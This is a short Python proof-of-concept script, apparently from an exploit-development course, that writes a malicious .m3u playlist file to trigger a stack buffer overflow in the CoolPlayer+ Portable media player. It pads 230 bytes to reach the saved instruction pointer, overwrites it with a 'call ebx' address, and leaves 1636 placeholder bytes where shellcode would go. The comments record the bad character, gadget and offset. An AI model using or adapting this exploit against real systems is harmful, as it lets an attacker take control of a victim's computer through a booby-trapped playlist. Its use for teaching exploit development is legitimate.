# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

# badchar for shellcode = '\x00'
#   0x00404ff5 : call ebx | startnull {PAGE_EXECUTE_READWRITE} [coolplayer+.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ptlabmachine\Desktop\CoolPlayer+Portable\App\CoolPlayer+\coolplayer+.exe)
# EIP offset: 230 - This offset is dependent on the location of .m3u file. In this module I have it on the Desktop

filename = "martin-songs.m3u"

evilString =  "A"*230 + "\xf5\x4f\x40\x00" + "C"*1636


file = open(filename,'w')
file.write(evilString)
file.close()